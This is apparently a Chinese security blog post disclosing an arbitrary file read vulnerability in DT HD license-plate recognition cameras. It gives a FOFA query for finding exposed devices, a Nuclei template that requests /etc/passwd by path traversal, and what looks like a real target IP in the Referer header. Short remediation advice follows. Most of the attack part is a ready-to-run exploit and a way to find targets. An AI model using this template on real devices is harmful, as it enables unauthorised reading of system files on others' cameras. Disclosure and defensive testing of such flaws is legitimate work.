#  DT-高清车牌识别摄像机存在任意文件读取漏洞   
原创 骇客安全  骇客安全   2025-02-28 11:51  
  
```
app="DT-高清车牌识别摄像机"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991OK5H7iaQX5vI9HXtia1oerI51trdxwAN2mzeIl2ibqqmibweJFmUeXiaicLECicsht6OumNKwdI7pUMdiczQ/640?wx_fmt=png&from=appmsg "null")  
  
2、部分界面如下   
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991OK5H7iaQX5vI9HXtia1oerI51baibFwRGics99IRIYrtvXLWyUXrk9b8JUyBD6qkMXUdeh5yMkBohAcw/640?wx_fmt=png&from=appmsg "null")  
  
  
3、隐患url，验证如下  
```
id: DT-information-leakage

info:
  name: DT-information-leakage
  author: xxxx
  severity: high

http:
- raw:
  - |+
    @timeout: 30s
    GET /../../../../etc/passwd HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://116.131.20.250:5001/


  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'root:'
    condition: and
```  
### 修复建议  
  
1、请联系厂商进行修复。   
2、如非必要，禁止公网访问该系统。   
3、设置白名单访问。  
  
  
  
